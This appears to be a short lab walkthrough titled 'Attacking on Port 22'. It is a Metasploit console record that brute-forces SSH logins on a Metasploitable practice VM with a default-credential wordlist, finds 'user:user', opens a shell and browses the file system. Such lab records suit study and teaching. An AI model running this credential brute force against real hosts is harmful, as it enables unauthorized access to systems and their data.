# Attacking on Port 22

```
msf6 > search ssh_login

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/ssh_login         .                normal  No     SSH Login Check Scanner
   1  auxiliary/scanner/ssh/ssh_login_pubkey  .                normal  No     SSH Public Key Login Scanner


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssh/ssh_login_pubkey

msf6 > use 0
msf6 auxiliary(scanner/ssh/ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting                                  Required  Description
   ----              ---------------                                  --------  -----------
   ANONYMOUS_LOGIN   false                                            yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   false                                            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                yes       How fast to bruteforce, from 0 to 5
   CreateSession     true                                             no        Create a new session for every successful login
   DB_ALL_CREDS      false                                            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none                                             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                                                           no        A specific password to authenticate with
   PASS_FILE                                                          no        File containing passwords, one per line
   RHOSTS            192.168.146.132                                  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploi
                                                                                t.html
   RPORT             22                                               yes       The target port
   STOP_ON_SUCCESS   false                                            yes       Stop guessing when a credential works for a host
   THREADS           1                                                yes       The number of concurrent threads (max one per host)
   USERNAME                                                           no        A specific username to authenticate as
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/  no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                            no        Try the username as the password for all users
   USER_FILE                                                          no        File containing usernames, one per line
   VERBOSE           false                                            yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.146.132
RHOSTS => 192.168.146.132
msf6 auxiliary(scanner/ssh/ssh_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/
adobe_top100_pass.txt                     hci_oracle_passwords.csv                  namelist.txt                              sid.txt
av-update-urls.txt                        http_default_pass.txt                     oracle_default_hashes.txt                 snmp_default_pass.txt
av_hips_executables.txt                   http_default_userpass.txt                 oracle_default_passwords.csv              superset_secret_keys.txt
burnett_top_1024.txt                      http_default_users.txt                    oracle_default_userpass.txt               telerik_ui_asp_net_ajax_versions.txt
burnett_top_500.txt                       http_owa_common.txt                       password.lst                              telnet_cdata_ftth_backdoor_userpass.txt
can_flood_frames.txt                      idrac_default_pass.txt                    piata_ssh_userpass.txt                    tftp.txt
cms400net_default_userpass.txt            idrac_default_user.txt                    postgres_default_pass.txt                 tomcat_mgr_default_pass.txt
common_roots.txt                          ipmi_passwords.txt                        postgres_default_user.txt                 tomcat_mgr_default_userpass.txt
dangerzone_a.txt                          ipmi_users.txt                            postgres_default_userpass.txt             tomcat_mgr_default_users.txt
dangerzone_b.txt                          joomla.txt                                root_userpass.txt                         unix_passwords.txt
db2_default_pass.txt                      keyboard-patterns.txt                     routers_userpass.txt                      unix_users.txt
db2_default_user.txt                      lync_subdomains.txt                       rpc_names.txt                             vnc_passwords.txt
db2_default_userpass.txt                  malicious_urls.txt                        rservices_from_users.txt                  vxworks_collide_20.txt
default_pass_for_services_unhash.txt      mirai_pass.txt                            sap_common.txt                            vxworks_common_20.txt
default_userpass_for_services_unhash.txt  mirai_user.txt                            sap_default.txt                           wp-exploitable-plugins.txt
default_users_for_services_unhash.txt     mirai_user_pass.txt                       sap_icm_paths.txt                         wp-exploitable-themes.txt
dlink_telnet_backdoor_userpass.txt        multi_vendor_cctv_dvr_pass.txt            scada_default_userpass.txt                wp-plugins.txt
flask_secret_keys.txt                     multi_vendor_cctv_dvr_users.txt           sensitive_files.txt                       wp-themes.txt
grafana_plugins.txt                       named_pipes.txt                           sensitive_files_win.txt                   
msf6 auxiliary(scanner/ssh/ssh_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/
USERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/
msf6 auxiliary(scanner/ssh/ssh_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt
USERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set VERBOSE true
VERBOSE => true
msf6 auxiliary(scanner/ssh/ssh_login) > run
[*] 192.168.146.132:22 - Starting bruteforce
[-] 192.168.146.132:22 - Failed: 'root:root'
[!] No active DB -- Credential data will not be saved!
[-] 192.168.146.132:22 - Failed: 'admin:admin'
[-] 192.168.146.132:22 - Failed: 'test:test'
[-] 192.168.146.132:22 - Failed: 'root:matrix'
[-] 192.168.146.132:22 - Failed: 'ghost:ghost'
[-] 192.168.146.132:22 - Failed: 'webmaster:123456'
[+] 192.168.146.132:22 - Success: 'user:user' 'uid=1001(user) gid=1001(user) groups=1001(user) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[*] SSH session 1 opened (192.168.146.130:43869 -> 192.168.146.132:22) at 2025-04-10 16:09:36 -0400
[-] 192.168.146.132:22 - Failed: 'root:1234'
[-] 192.168.146.132:22 - Failed: 'username:username'
[-] 192.168.146.132:22 - Failed: 'username:password'
[-] 192.168.146.132:22 - Failed: 'root:password'
[-] 192.168.146.132:22 - Failed: 'admin:password'
^C[*] Caught interrupt from the console...
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type         Information  Connection
  --  ----  ----         -----------  ----------
  1         shell linux  SSH kali @   192.168.146.130:43869 -> 192.168.146.132:22 (192.168.146.132)

msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 1
[*] Starting interaction with 1...

pwd
/home/user
ls -la
total 28
drwxr-xr-x 3 user user 4096 2010-05-07 14:38 .
drwxr-xr-x 6 root root 4096 2010-04-16 02:16 ..
-rw------- 1 user user  165 2010-05-07 14:38 .bash_history
-rw-r--r-- 1 user user  220 2010-03-31 06:42 .bash_logout
-rw-r--r-- 1 user user 2928 2010-03-31 06:42 .bashrc
-rw-r--r-- 1 user user  586 2010-03-31 06:42 .profile
drwx------ 2 user user 4096 2010-05-07 14:36 .ssh
cd /
ls -la
total 89
drwxr-xr-x  21 root root  4096 2012-05-20 14:36 .
drwxr-xr-x  21 root root  4096 2012-05-20 14:36 ..
drwxr-xr-x   2 root root  4096 2012-05-13 23:35 bin
drwxr-xr-x   4 root root  1024 2012-05-13 23:36 boot
lrwxrwxrwx   1 root root    11 2010-04-28 16:26 cdrom -> media/cdrom
drwxr-xr-x  13 root root 13820 2025-04-10 15:12 dev
drwxr-xr-x  94 root root  4096 2025-04-10 16:03 etc
drwxr-xr-x   6 root root  4096 2010-04-16 02:16 home
drwxr-xr-x   2 root root  4096 2010-03-16 18:57 initrd
lrwxrwxrwx   1 root root    32 2010-04-28 16:26 initrd.img -> boot/initrd.img-2.6.24-16-server
drwxr-xr-x  13 root root  4096 2012-05-13 23:35 lib
drwx------   2 root root 16384 2010-03-16 18:55 lost+found
drwxr-xr-x   4 root root  4096 2010-03-16 18:55 media
drwxr-xr-x   3 root root  4096 2010-04-28 16:16 mnt
-rw-------   1 root root  5821 2025-04-10 15:12 nohup.out
drwxr-xr-x   2 root root  4096 2010-03-16 18:57 opt
dr-xr-xr-x 114 root root     0 2025-04-10 15:11 proc
drwxr-xr-x  13 root root  4096 2025-04-10 15:12 root
drwxr-xr-x   2 root root  4096 2012-05-13 21:54 sbin
drwxr-xr-x   2 root root  4096 2010-03-16 18:57 srv
drwxr-xr-x  12 root root     0 2025-04-10 15:11 sys
drwxrwxrwt   4 root root  4096 2025-04-10 15:12 tmp
drwxr-xr-x  12 root root  4096 2010-04-28 00:06 usr
drwxr-xr-x  14 root root  4096 2010-03-17 10:08 var
lrwxrwxrwx   1 root root    29 2010-04-28 16:21 vmlinuz -> boot/vmlinuz-2.6.24-16-server


```



